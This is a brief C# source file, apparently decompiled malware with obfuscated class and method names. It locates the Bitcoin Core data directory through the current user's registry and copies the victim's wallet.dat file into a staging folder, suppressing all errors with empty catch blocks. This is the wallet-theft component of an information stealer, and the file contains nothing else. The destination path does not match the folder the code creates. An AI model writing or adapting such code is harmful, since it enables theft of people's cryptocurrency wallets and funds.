using Microsoft.Win32;
using System.IO;

internal class ar
{
	public static void a(string jm)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
			{
				try
				{
					Directory.CreateDirectory(jm + "\\Wallets\\BitcoinCore\\");
					File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", jm + "\\BitcoinCore\\wallet.dat");
					ba.a++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
